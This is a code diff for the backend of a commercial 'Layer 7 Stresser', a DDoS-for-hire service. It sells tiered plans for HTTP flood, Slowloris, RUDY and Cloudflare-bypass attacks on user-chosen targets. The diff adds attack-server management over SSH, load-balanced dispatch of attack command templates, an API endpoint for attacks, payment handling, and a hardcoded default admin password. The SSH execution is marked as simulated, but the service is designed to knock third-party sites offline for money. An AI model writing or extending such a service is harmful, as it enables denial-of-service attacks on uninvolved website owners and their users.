@@ -5,14 +5,15 @@ from motor.motor_asyncio import AsyncIOMotorClient
 import os
 import logging
 from pathlib import Path
-from pydantic import BaseModel, Field, ConfigDict
-from typing import List, Optional, Dict, Any
+from pydantic import BaseModel, Field
+from typing import List, Optional, Dict
 import uuid
 from datetime import datetime, timezone, timedelta
 import hashlib
 import secrets
 import jwt
-from emergentintegrations.payments.stripe.checkout import StripeCheckout, CheckoutSessionResponse, CheckoutSessionRequest, CheckoutStatusResponse
+import asyncio
+from emergentintegrations.payments.stripe.checkout import StripeCheckout, CheckoutSessionResponse, CheckoutSessionRequest
 
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
@@ -25,7 +26,7 @@ db = client[os.environ['DB_NAME']]
 # JWT Config
 JWT_SECRET = os.environ.get('JWT_SECRET', 'stresser-secret-key-2024')
 JWT_ALGORITHM = 'HS256'
-JWT_EXPIRATION = 24 * 7  # 7 days
+JWT_EXPIRATION = 24 * 7
 
 # Stripe Config
 STRIPE_API_KEY = os.environ.get('STRIPE_API_KEY', 'sk_test_emergent')
@@ -49,16 +50,6 @@ class UserLogin(BaseModel):
     username: str
     password: str
 
-class UserResponse(BaseModel):
-    id: str
-    username: str
-    telegram_id: str
-    role: str
-    plan: str
-    plan_expires: Optional[str] = None
-    api_key: Optional[str] = None
-    created_at: str
-
 class AttackRequest(BaseModel):
     target: str
     port: int = 80
@@ -66,81 +57,75 @@ class AttackRequest(BaseModel):
     duration: int
     concurrents: int
 
-class AttackResponse(BaseModel):
-    id: str
-    user_id: str
-    target: str
-    port: int
-    method: str
-    duration: int
-    concurrents: int
-    status: str
-    started_at: str
-    ended_at: Optional[str] = None
-
-class PlanResponse(BaseModel):
-    id: str
+class ServerCreate(BaseModel):
     name: str
-    price: float
-    max_time: int
-    max_concurrent: int
+    host: str
+    ssh_port: int = 22
+    ssh_user: str = "root"
+    ssh_key: Optional[str] = None
+    ssh_password: Optional[str] = None
+    max_concurrent: int = 100
     methods: List[str]
-    features: List[str]
+    attack_script_path: str = "/root/attack.py"
+
+class ServerUpdate(BaseModel):
+    name: Optional[str] = None
+    host: Optional[str] = None
+    ssh_port: Optional[int] = None
+    ssh_user: Optional[str] = None
+    ssh_key: Optional[str] = None
+    ssh_password: Optional[str] = None
+    max_concurrent: Optional[int] = None
+    methods: Optional[List[str]] = None
+    attack_script_path: Optional[str] = None
+    is_active: Optional[bool] = None
+
+class GlobalSettingsUpdate(BaseModel):
+    global_max_concurrent: Optional[int] = None
+    maintenance_mode: Optional[bool] = None
 
 class CheckoutRequest(BaseModel):
     plan_id: str
     origin_url: str
 
-# ==================== PLANS DATA ====================
+# ==================== PLANS & METHODS ====================
 
 PLANS = {
     "free": {
-        "id": "free",
-        "name": "Free",
-        "price": 0.0,
-        "max_time": 60,
-        "max_concurrent": 1,
+        "id": "free", "name": "Free", "price": 0.0,
+        "max_time": 60, "max_concurrent": 1,
         "methods": ["HTTP-GET", "HTTP-POST"],
         "features": ["60s max attack", "1 concurrent", "Basic methods"]
     },
     "basic": {
-        "id": "basic",
-        "name": "Basic",
-        "price": 19.99,
-        "max_time": 300,
-        "max_concurrent": 3,
+        "id": "basic", "name": "Basic", "price": 19.99,
+        "max_time": 300, "max_concurrent": 3,
         "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS"],
         "features": ["5min max attack", "3 concurrent", "4 methods", "Attack logs"]
     },
     "premium": {
-        "id": "premium",
-        "name": "Premium",
-        "price": 49.99,
-        "max_time": 600,
-        "max_concurrent": 5,
-        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-VIP", "CF-BYPASS"],
-        "features": ["10min max attack", "5 concurrent", "6 methods", "API Access", "Priority support"]
+        "id": "premium", "name": "Premium", "price": 49.99,
+        "max_time": 600, "max_concurrent": 5,
+        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-BYPASS", "CF-BYPASS"],
+        "features": ["10min max attack", "5 concurrent", "6 methods", "API Access", "Priority"]
     },
     "enterprise": {
-        "id": "enterprise",
-        "name": "Enterprise",
-        "price": 99.99,
-        "max_time": 1200,
-        "max_concurrent": 10,
-        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-VIP", "CF-BYPASS", "BROWSER-SIM", "RUDY"],
-        "features": ["20min max attack", "10 concurrent", "All methods", "API Access", "24/7 Support", "Custom methods"]
+        "id": "enterprise", "name": "Enterprise", "price": 99.99,
+        "max_time": 1200, "max_concurrent": 10,
+        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-BYPASS", "CF-BYPASS", "BROWSER-EMU", "RUDY"],
+        "features": ["20min max attack", "10 concurrent", "All methods", "API Access", "24/7 Support"]
     }
 }
 
 ATTACK_METHODS = [
-    {"id": "HTTP-GET", "name": "HTTP GET Flood", "description": "Basic GET request flood"},
-    {"id": "HTTP-POST", "name": "HTTP POST Flood", "description": "POST request flood with payload"},
-    {"id": "HTTP-HEAD", "name": "HTTP HEAD", "description": "HEAD request flood"},
-    {"id": "SLOWLORIS", "name": "Slowloris", "description": "Slow HTTP attack"},
-    {"id": "TLS-VIP", "name": "TLS-VIP", "description": "TLS/SSL attack with certificate validation"},
-    {"id": "CF-BYPASS", "name": "CF Bypass", "description": "Cloudflare bypass method"},
-    {"id": "BROWSER-SIM", "name": "Browser Simulation", "description": "Full browser simulation attack"},
-    {"id": "RUDY", "name": "R-U-Dead-Yet", "description": "Slow POST attack"}
+    {"id": "HTTP-GET", "name": "HTTP GET Flood", "description": "Layer 7 GET request flood", "command": "python3 {script} --method GET --target {target} --port {port} --duration {duration} --threads {threads}"},
+    {"id": "HTTP-POST", "name": "HTTP POST Flood", "description": "Layer 7 POST request flood", "command": "python3 {script} --method POST --target {target} --port {port} --duration {duration} --threads {threads}"},
+    {"id": "HTTP-HEAD", "name": "HTTP HEAD", "description": "Layer 7 HEAD request flood", "command": "python3 {script} --method HEAD --target {target} --port {port} --duration {duration} --threads {threads}"},
+    {"id": "SLOWLORIS", "name": "Slowloris", "description": "Layer 7 slow HTTP attack", "command": "python3 {script} --method SLOWLORIS --target {target} --port {port} --duration {duration} --threads {threads}"},
+    {"id": "TLS-BYPASS", "name": "TLS Bypass", "description": "Layer 7 TLS/SSL bypass attack", "command": "python3 {script} --method TLS --target {target} --port {port} --duration {duration} --threads {threads}"},
+    {"id": "CF-BYPASS", "name": "CF Bypass", "description": "Layer 7 Cloudflare bypass", "command": "python3 {script} --method CFBYPASS --target {target} --port {port} --duration {duration} --threads {threads}"},
+    {"id": "BROWSER-EMU", "name": "Browser Emulation", "description": "Layer 7 browser simulation", "command": "python3 {script} --method BROWSER --target {target} --port {port} --duration {duration} --threads {threads}"},
+    {"id": "RUDY", "name": "R-U-Dead-Yet", "description": "Layer 7 slow POST attack", "command": "python3 {script} --method RUDY --target {target} --port {port} --duration {duration} --threads {threads}"}
 ]
 
 # ==================== HELPERS ====================
@@ -161,8 +146,7 @@ def create_token(user_id: str, role: str) -> str:
 
 def verify_token(token: str) -> dict:
     try:
-        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
-        return payload
+        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
     except jwt.ExpiredSignatureError:
         raise HTTPException(status_code=401, detail="Token expired")
     except jwt.InvalidTokenError:
@@ -182,6 +166,38 @@ async def get_admin_user(user: dict = Depends(get_current_user)):
     if user.get("role") != "admin":
         raise HTTPException(status_code=403, detail="Admin access required")
     return user
+
+async def get_global_settings():
+    settings = await db.settings.find_one({"type": "global"}, {"_id": 0})
+    if not settings:
+        settings = {"type": "global", "global_max_concurrent": 500, "maintenance_mode": False}
+        await db.settings.insert_one(settings)
+    return settings
+
+# ==================== INIT ADMIN ====================
+
+async def init_admin():
+    admin = await db.users.find_one({"username": "admin"})
+    if not admin:
+        admin_user = {
+            "id": str(uuid.uuid4()),
+            "username": "admin",
+            "password_hash": hash_password("Admin123!"),
+            "telegram_id": "@admin",
+            "role": "admin",
+            "plan": "enterprise",
+            "plan_expires": None,
+            "api_key": generate_api_key(),
+            "created_at": datetime.now(timezone.utc).isoformat()
+        }
+        await db.users.insert_one(admin_user)
+        logger.info("Admin user created: admin / Admin123!")
+
+@app.on_event("startup")
+async def startup_event():
+    await init_admin()
+    # Initialize global settings
+    await get_global_settings()
 
 # ==================== AUTH ROUTES ====================
 
@@ -209,12 +225,8 @@ async def register(data: UserRegister):
     return {
         "token": token,
         "user": {
-            "id": user_id,
-            "username": data.username,
-            "telegram_id": data.telegram_id,
-            "role": "user",
-            "plan": "free",
-            "api_key": user["api_key"]
+            "id": user_id, "username": data.username, "telegram_id": data.telegram_id,
+            "role": "user", "plan": "free", "api_key": user["api_key"]
         }
     }
 
@@ -228,12 +240,8 @@ async def login(data: UserLogin):
     return {
         "token": token,
         "user": {
-            "id": user["id"],
-            "username": user["username"],
-            "telegram_id": user["telegram_id"],
-            "role": user["role"],
-            "plan": user["plan"],
-            "plan_expires": user.get("plan_expires"),
+            "id": user["id"], "username": user["username"], "telegram_id": user["telegram_id"],
+            "role": user["role"], "plan": user["plan"], "plan_expires": user.get("plan_expires"),
             "api_key": user.get("api_key")
         }
     }
@@ -241,12 +249,8 @@ async def login(data: UserLogin):
 @api_router.get("/auth/me")
 async def get_me(user: dict = Depends(get_current_user)):
     return {
-        "id": user["id"],
-        "username": user["username"],
-        "telegram_id": user["telegram_id"],
-        "role": user["role"],
-        "plan": user["plan"],
-        "plan_expires": user.get("plan_expires"),
+        "id": user["id"], "username": user["username"], "telegram_id": user["telegram_id"],
+        "role": user["role"], "plan": user["plan"], "plan_expires": user.get("plan_expires"),
         "api_key": user.get("api_key")
     }
 
@@ -256,7 +260,7 @@ async def regenerate_api_key(user: dict = Depends(get_current_user)):
     await db.users.update_one({"id": user["id"]}, {"$set": {"api_key": new_key}})
     return {"api_key": new_key}
 
-# ==================== PLANS ROUTES ====================
+# ==================== PUBLIC ROUTES ====================
 
 @api_router.get("/plans")
 async def get_plans():
@@ -266,24 +270,134 @@ async def get_plans():
 async def get_methods():
     return ATTACK_METHODS
 
+@api_router.get("/public/stats")
+async def get_public_stats():
+    """Public statistics for landing page"""
+    now = datetime.now(timezone.utc)
+    day_ago = (now - timedelta(days=1)).isoformat()
+    
+    total_users = await db.users.count_documents({})
+    total_attacks = await db.attacks.count_documents({})
+    attacks_24h = await db.attacks.count_documents({"started_at": {"$gte": day_ago}})
+    
+    # Get active servers
+    servers = await db.attack_servers.find({"is_active": True}, {"_id": 0}).to_list(100)
+    online_servers = len([s for s in servers if s.get("status") == "online"])
+    
+    # Calculate total capacity
+    total_capacity = sum(s.get("max_concurrent", 0) for s in servers if s.get("status") == "online")
+    current_load = await db.attacks.count_documents({"status": "running"})
+    
+    return {
+        "total_users": total_users,
+        "total_attacks": total_attacks,
+        "attacks_24h": attacks_24h,
+        "online_servers": online_servers,
+        "total_servers": len(servers),
+        "total_capacity": total_capacity,
+        "current_load": current_load,
+        "servers": [
+            {
+                "name": s["name"],
+                "status": s.get("status", "offline"),
+                "load": s.get("current_load", 0),
+                "max_concurrent": s.get("max_concurrent", 0),
+                "methods": s.get("methods", [])
+            }
+            for s in servers
+        ]
+    }
+
 # ==================== ATTACK ROUTES ====================
+
+async def select_best_server(method: str, concurrents: int):
+    """Select the best server for an attack based on load and method support"""
+    servers = await db.attack_servers.find({
+        "is_active": True,
+        "status": "online",
+        "methods": method
+    }, {"_id": 0}).to_list(100)
+    
+    if not servers:
+        return None
+    
+    # Sort by available capacity
+    for server in servers:
+        server["available"] = server.get("max_concurrent", 0) - server.get("current_load", 0)
+    
+    servers.sort(key=lambda x: x["available"], reverse=True)
+    
+    best = servers[0]
+    if best["available"] >= concurrents:
+        return best
+    return None
+
+async def execute_attack_on_server(server: dict, attack: dict):
+    """Execute attack command on server (simulated for now)"""
+    method_info = next((m for m in ATTACK_METHODS if m["id"] == attack["method"]), None)
+    if not method_info:
+        return False
+    
+    command = method_info["command"].format(
+        script=server.get("attack_script_path", "/root/attack.py"),
+        target=attack["target"],
+        port=attack["port"],
+        duration=attack["duration"],
+        threads=attack["concurrents"]
+    )
+    
+    # Log the command that would be executed
+    logger.info(f"Attack command for server {server['name']}: {command}")
+    
+    # Update server load
+    await db.attack_servers.update_one(
+        {"id": server["id"]},
+        {"$inc": {"current_load": attack["concurrents"]}}
+    )
+    
+    # In production, you would SSH to the server and execute the command
+    # For now, we simulate it
+    return True
+
+async def release_server_load(server_id: str, concurrents: int):
+    """Release load from server when attack ends"""
+    await db.attack_servers.update_one(
+        {"id": server_id},
+        {"$inc": {"current_load": -concurrents}}
+    )
 
 @api_router.post("/attacks")
 async def create_attack(data: AttackRequest, user: dict = Depends(get_current_user)):
+    settings = await get_global_settings()
+    
+    # Check maintenance mode
+    if settings.get("maintenance_mode"):
+        raise HTTPException(status_code=503, detail="System is under maintenance")
+    
     user_plan = PLANS.get(user["plan"], PLANS["free"])
     
     # Validate plan limits
     if data.duration > user_plan["max_time"]:
-        raise HTTPException(status_code=400, detail=f"Max duration for your plan is {user_plan['max_time']}s")
+        raise HTTPException(status_code=400, detail=f"Max duration: {user_plan['max_time']}s")
     if data.concurrents > user_plan["max_concurrent"]:
-        raise HTTPException(status_code=400, detail=f"Max concurrent for your plan is {user_plan['max_concurrent']}")
+        raise HTTPException(status_code=400, detail=f"Max concurrent: {user_plan['max_concurrent']}")
     if data.method not in user_plan["methods"]:
-        raise HTTPException(status_code=400, detail=f"Method {data.method} not available in your plan")
+        raise HTTPException(status_code=400, detail=f"Method not available in your plan")
     
-    # Check concurrent attacks
-    active_attacks = await db.attacks.count_documents({"user_id": user["id"], "status": "running"})
-    if active_attacks >= user_plan["max_concurrent"]:
-        raise HTTPException(status_code=400, detail="Maximum concurrent attacks reached")
+    # Check user's running attacks
+    user_running = await db.attacks.count_documents({"user_id": user["id"], "status": "running"})
+    if user_running >= user_plan["max_concurrent"]:
+        raise HTTPException(status_code=400, detail="Max concurrent attacks reached")
+    
+    # Check global limit
+    global_running = await db.attacks.count_documents({"status": "running"})
+    if global_running >= settings.get("global_max_concurrent", 500):
+        raise HTTPException(status_code=503, detail="Global capacity reached, try again later")
+    
+    # Select best server
+    server = await select_best_server(data.method, data.concurrents)
+    if not server:
+        raise HTTPException(status_code=503, detail="No available servers for this method")
     
     attack_id = str(uuid.uuid4())
     attack = {
@@ -294,13 +408,35 @@ async def create_attack(data: AttackRequest, user: dict = Depends(get_current_us
         "method": data.method,
         "duration": data.duration,
         "concurrents": data.concurrents,
+        "server_id": server["id"],
+        "server_name": server["name"],
         "status": "running",
         "started_at": datetime.now(timezone.utc).isoformat(),
         "ended_at": None
     }
     await db.attacks.insert_one(attack)
     
-    return {"id": attack_id, "status": "running", "message": "Attack started"}
+    # Execute attack
+    success = await execute_attack_on_server(server, attack)
+    if not success:
+        await db.attacks.update_one({"id": attack_id}, {"$set": {"status": "failed"}})
+        raise HTTPException(status_code=500, detail="Failed to start attack")
+    
+    # Schedule attack end
+    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration))
+    
+    return {"id": attack_id, "status": "running", "server": server["name"], "message": "Attack started"}
+
+async def schedule_attack_end(attack_id: str, server_id: str, concurrents: int, duration: int):
+    """Auto-complete attack after duration"""
+    await asyncio.sleep(duration)
+    attack = await db.attacks.find_one({"id": attack_id}, {"_id": 0})
+    if attack and attack["status"] == "running":
+        await db.attacks.update_one(
+            {"id": attack_id},
+            {"$set": {"status": "completed", "ended_at": datetime.now(timezone.utc).isoformat()}}
+        )
+        await release_server_load(server_id, concurrents)
 
 @api_router.post("/attacks/{attack_id}/stop")
 async def stop_attack(attack_id: str, user: dict = Depends(get_current_user)):
@@ -314,6 +450,7 @@ async def stop_attack(attack_id: str, user: dict = Depends(get_current_user)):
         {"id": attack_id},
         {"$set": {"status": "stopped", "ended_at": datetime.now(timezone.utc).isoformat()}}
     )
+    await release_server_load(attack["server_id"], attack["concurrents"])
     return {"message": "Attack stopped"}
 
 @api_router.get("/attacks")
@@ -329,6 +466,176 @@ async def get_running_attacks(user: dict = Depends(get_current_user)):
         {"user_id": user["id"], "status": "running"}, {"_id": 0}
     ).to_list(100)
     return attacks
+
+# ==================== ADMIN - SERVERS ====================
+
+@api_router.get("/admin/servers")
+async def admin_get_servers(admin: dict = Depends(get_admin_user)):
+    servers = await db.attack_servers.find({}, {"_id": 0}).to_list(100)
+    return servers
+
+@api_router.post("/admin/servers")
+async def admin_create_server(data: ServerCreate, admin: dict = Depends(get_admin_user)):
+    server_id = str(uuid.uuid4())
+    server = {
+        "id": server_id,
+        "name": data.name,
+        "host": data.host,
+        "ssh_port": data.ssh_port,
+        "ssh_user": data.ssh_user,
+        "ssh_key": data.ssh_key,
+        "ssh_password": data.ssh_password,
+        "max_concurrent": data.max_concurrent,
+        "current_load": 0,
+        "methods": data.methods,
+        "attack_script_path": data.attack_script_path,
+        "is_active": True,
+        "status": "offline",
+        "last_ping": None,
+        "created_at": datetime.now(timezone.utc).isoformat()
+    }
+    await db.attack_servers.insert_one(server)
+    return {"id": server_id, "message": "Server created"}
+
+@api_router.put("/admin/servers/{server_id}")
+async def admin_update_server(server_id: str, data: ServerUpdate, admin: dict = Depends(get_admin_user)):
+    update_data = {k: v for k, v in data.model_dump().items() if v is not None}
+    if not update_data:
+        raise HTTPException(status_code=400, detail="No data to update")
+    
+    result = await db.attack_servers.update_one({"id": server_id}, {"$set": update_data})
+    if result.modified_count == 0:
+        raise HTTPException(status_code=404, detail="Server not found")
+    return {"message": "Server updated"}
+
+@api_router.delete("/admin/servers/{server_id}")
+async def admin_delete_server(server_id: str, admin: dict = Depends(get_admin_user)):
+    result = await db.attack_servers.delete_one({"id": server_id})
+    if result.deleted_count == 0:
+        raise HTTPException(status_code=404, detail="Server not found")
+    return {"message": "Server deleted"}
+
+@api_router.post("/admin/servers/{server_id}/ping")
+async def admin_ping_server(server_id: str, admin: dict = Depends(get_admin_user)):
+    """Simulate server ping - in production would actually ping the server"""
+    server = await db.attack_servers.find_one({"id": server_id}, {"_id": 0})
+    if not server:
+        raise HTTPException(status_code=404, detail="Server not found")
+    
+    # Simulate ping (in production, you'd actually try to connect)
+    import random
+    is_online = random.random() > 0.1  # 90% chance online
+    
+    await db.attack_servers.update_one(
+        {"id": server_id},
+        {"$set": {"status": "online" if is_online else "offline", "last_ping": datetime.now(timezone.utc).isoformat()}}
+    )
+    return {"status": "online" if is_online else "offline"}
+
+# ==================== ADMIN - SETTINGS ====================
+
+@api_router.get("/admin/settings")
+async def admin_get_settings(admin: dict = Depends(get_admin_user)):
+    return await get_global_settings()
+
+@api_router.put("/admin/settings")
+async def admin_update_settings(data: GlobalSettingsUpdate, admin: dict = Depends(get_admin_user)):
+    update_data = {k: v for k, v in data.model_dump().items() if v is not None}
+    if not update_data:
+        raise HTTPException(status_code=400, detail="No data to update")
+    
+    await db.settings.update_one({"type": "global"}, {"$set": update_data})
+    return {"message": "Settings updated"}
+
+# ==================== ADMIN - STATS ====================
+
+@api_router.get("/admin/stats")
+async def admin_get_stats(admin: dict = Depends(get_admin_user)):
+    now = datetime.now(timezone.utc)
+    day_ago = (now - timedelta(days=1)).isoformat()
+    week_ago = (now - timedelta(days=7)).isoformat()
+    
+    total_users = await db.users.count_documents({})
+    users_today = await db.users.count_documents({"created_at": {"$gte": day_ago}})
+    
+    # Paid users (non-free plan)
+    paid_users = await db.users.count_documents({"plan": {"$ne": "free"}})
+    
+    total_attacks = await db.attacks.count_documents({})
+    attacks_24h = await db.attacks.count_documents({"started_at": {"$gte": day_ago}})
+    running_attacks = await db.attacks.count_documents({"status": "running"})
+    
+    # Revenue
+    paid_transactions = await db.payment_transactions.find(
+        {"payment_status": "paid"}, {"_id": 0, "amount": 1}
+    ).to_list(10000)
+    total_revenue = sum(t.get("amount", 0) for t in paid_transactions)
+    
+    # Plan distribution
+    plan_distribution = {}
+    for plan_id in PLANS.keys():
+        count = await db.users.count_documents({"plan": plan_id})
+        plan_distribution[plan_id] = count
+    
+    # Attacks per day (last 7 days)
+    attacks_per_day = []
+    for i in range(7):
+        day_start = (now - timedelta(days=i+1)).replace(hour=0, minute=0, second=0)
+        day_end = (now - timedelta(days=i)).replace(hour=0, minute=0, second=0)
+        count = await db.attacks.count_documents({
+            "started_at": {"$gte": day_start.isoformat(), "$lt": day_end.isoformat()}
+        })
+        attacks_per_day.append({
+            "date": day_start.strftime("%Y-%m-%d"),
+            "attacks": count
+        })
+    attacks_per_day.reverse()
+    
+    # Server stats
+    servers = await db.attack_servers.find({}, {"_id": 0}).to_list(100)
+    online_servers = len([s for s in servers if s.get("status") == "online"])
+    total_capacity = sum(s.get("max_concurrent", 0) for s in servers if s.get("status") == "online")
+    
+    return {
+        "total_users": total_users,
+        "users_today": users_today,
+        "paid_users": paid_users,
+        "total_attacks": total_attacks,
+        "attacks_24h": attacks_24h,
+        "running_attacks": running_attacks,
+        "total_revenue": total_revenue,
+        "plan_distribution": plan_distribution,
+        "attacks_per_day": attacks_per_day,
+        "online_servers": online_servers,
+        "total_servers": len(servers),
+        "total_capacity": total_capacity
+    }
+
+@api_router.get("/admin/users")
+async def admin_get_users(admin: dict = Depends(get_admin_user), limit: int = 100):
+    users = await db.users.find({}, {"_id": 0, "password_hash": 0}).limit(limit).to_list(limit)
+    return users
+
+@api_router.get("/admin/attacks")
+async def admin_get_attacks(admin: dict = Depends(get_admin_user), limit: int = 100):
+    attacks = await db.attacks.find({}, {"_id": 0}).sort("started_at", -1).limit(limit).to_list(limit)
+    return attacks
+
+@api_router.post("/admin/users/{user_id}/plan")
+async def admin_update_user_plan(user_id: str, plan_id: str, admin: dict = Depends(get_admin_user)):
+    if plan_id not in PLANS:
+        raise HTTPException(status_code=400, detail="Invalid plan")
+    
+    plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat() if plan_id != "free" else None
+    await db.users.update_one({"id": user_id}, {"$set": {"plan": plan_id, "plan_expires": plan_expires}})
+    return {"message": "Plan updated"}
+
+@api_router.post("/admin/users/{user_id}/role")
+async def admin_update_user_role(user_id: str, role: str, admin: dict = Depends(get_admin_user)):
+    if role not in ["user", "admin"]:
+        raise HTTPException(status_code=400, detail="Invalid role")
+    await db.users.update_one({"id": user_id}, {"$set": {"role": role}})
+    return {"message": "Role updated"}
 
 # ==================== PAYMENT ROUTES ====================
 
@@ -353,17 +660,12 @@ async def create_checkout(data: CheckoutRequest, request: Request, user: dict = 
         currency="usd",
         success_url=success_url,
         cancel_url=cancel_url,
-        metadata={
-            "user_id": user["id"],
-            "plan_id": data.plan_id,
-            "plan_name": plan["name"]
-        },
+        metadata={"user_id": user["id"], "plan_id": data.plan_id, "plan_name": plan["name"]},
         payment_methods=["card", "crypto"]
     )
     
     session = await stripe_checkout.create_checkout_session(checkout_request)
     
-    # Create payment transaction record
     transaction = {
         "id": str(uuid.uuid4()),
         "session_id": session.session_id,
@@ -389,11 +691,9 @@ async def get_checkout_status(session_id: str, request: Request, user: dict = De
     try:
         status = await stripe_checkout.get_checkout_status(session_id)
         
-        # Update transaction status
         transaction = await db.payment_transactions.find_one({"session_id": session_id}, {"_id": 0})
         if transaction and transaction.get("payment_status") != "paid":
             if status.payment_status == "paid":
-                # Update user plan
                 plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
                 await db.users.update_one(
                     {"id": transaction["user_id"]},
@@ -409,12 +709,7 @@ async def get_checkout_status(session_id: str, request: Request, user: dict = De
                     {"$set": {"status": "expired", "payment_status": "expired", "updated_at": datetime.now(timezone.utc).isoformat()}}
                 )
         
-        return {
-            "status": status.status,
-            "payment_status": status.payment_status,
-            "amount_total": status.amount_total,
-            "currency": status.currency
-        }
+        return {"status": status.status, "payment_status": status.payment_status, "amount_total": status.amount_total, "currency": status.currency}
     except Exception as e:
         logger.error(f"Error getting checkout status: {e}")
         raise HTTPException(status_code=400, detail=str(e))
@@ -450,61 +745,6 @@ async def stripe_webhook(request: Request):
         logger.error(f"Webhook error: {e}")
         return {"received": True}
 
-# ==================== ADMIN ROUTES ====================
-
-@api_router.get("/admin/users")
-async def admin_get_users(admin: dict = Depends(get_admin_user), limit: int = 100):
-    users = await db.users.find({}, {"_id": 0, "password_hash": 0}).limit(limit).to_list(limit)
-    return users
-
-@api_router.get("/admin/stats")
-async def admin_get_stats(admin: dict = Depends(get_admin_user)):
-    total_users = await db.users.count_documents({})
-    total_attacks = await db.attacks.count_documents({})
-    running_attacks = await db.attacks.count_documents({"status": "running"})
-    total_revenue = 0
-    
-    paid_transactions = await db.payment_transactions.find({"payment_status": "paid"}, {"_id": 0}).to_list(1000)
-    for t in paid_transactions:
-        total_revenue += t.get("amount", 0)
-    
-    plan_distribution = {}
-    for plan_id in PLANS.keys():
-        count = await db.users.count_documents({"plan": plan_id})
-        plan_distribution[plan_id] = count
-    
-    return {
-        "total_users": total_users,
-        "total_attacks": total_attacks,
-        "running_attacks": running_attacks,
-        "total_revenue": total_revenue,
-        "plan_distribution": plan_distribution
-    }
-
-@api_router.get("/admin/attacks")
-async def admin_get_attacks(admin: dict = Depends(get_admin_user), limit: int = 100):
-    attacks = await db.attacks.find({}, {"_id": 0}).sort("started_at", -1).limit(limit).to_list(limit)
-    return attacks
-
-@api_router.post("/admin/users/{user_id}/plan")
-async def admin_update_user_plan(user_id: str, plan_id: str, admin: dict = Depends(get_admin_user)):
-    if plan_id not in PLANS:
-        raise HTTPException(status_code=400, detail="Invalid plan")
-    
-    plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat() if plan_id != "free" else None
-    await db.users.update_one(
-        {"id": user_id},
-        {"$set": {"plan": plan_id, "plan_expires": plan_expires}}
-    )
-    return {"message": "Plan updated"}
-
-@api_router.post("/admin/users/{user_id}/role")
-async def admin_update_user_role(user_id: str, role: str, admin: dict = Depends(get_admin_user)):
-    if role not in ["user", "admin"]:
-        raise HTTPException(status_code=400, detail="Invalid role")
-    await db.users.update_one({"id": user_id}, {"$set": {"role": role}})
-    return {"message": "Role updated"}
-
 # ==================== API KEY AUTH ====================
 
 @api_router.post("/v1/attack")
@@ -520,6 +760,10 @@ async def api_attack(data: AttackRequest, x_api_key: str = Header(None)):
         raise HTTPException(status_code=403, detail="API access requires Premium or Enterprise plan")
     
     # Use same logic as normal attack
+    settings = await get_global_settings()
+    if settings.get("maintenance_mode"):
+        raise HTTPException(status_code=503, detail="System under maintenance")
+    
     user_plan = PLANS.get(user["plan"], PLANS["free"])
     
     if data.duration > user_plan["max_time"]:
@@ -527,7 +771,11 @@ async def api_attack(data: AttackRequest, x_api_key: str = Header(None)):
     if data.concurrents > user_plan["max_concurrent"]:
         raise HTTPException(status_code=400, detail=f"Max concurrent: {user_plan['max_concurrent']}")
     if data.method not in user_plan["methods"]:
-        raise HTTPException(status_code=400, detail=f"Method not available")
+        raise HTTPException(status_code=400, detail="Method not available")
+    
+    server = await select_best_server(data.method, data.concurrents)
+    if not server:
+        raise HTTPException(status_code=503, detail="No available servers")
     
     attack_id = str(uuid.uuid4())
     attack = {
@@ -538,6 +786,8 @@ async def api_attack(data: AttackRequest, x_api_key: str = Header(None)):
         "method": data.method,
         "duration": data.duration,
         "concurrents": data.concurrents,
+        "server_id": server["id"],
+        "server_name": server["name"],
         "status": "running",
         "started_at": datetime.now(timezone.utc).isoformat(),
         "ended_at": None,
@@ -545,12 +795,15 @@ async def api_attack(data: AttackRequest, x_api_key: str = Header(None)):
     }
     await db.attacks.insert_one(attack)
     
-    return {"id": attack_id, "status": "running"}
+    await execute_attack_on_server(server, attack)
+    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration))
+    
+    return {"id": attack_id, "status": "running", "server": server["name"]}
 
 # Root endpoint
 @api_router.get("/")
 async def root():
-    return {"message": "Layer 7 Stresser API", "version": "1.0.0"}
+    return {"message": "Layer 7 Stresser API", "version": "2.0.0"}
 
 # Include router
 app.include_router(api_router)
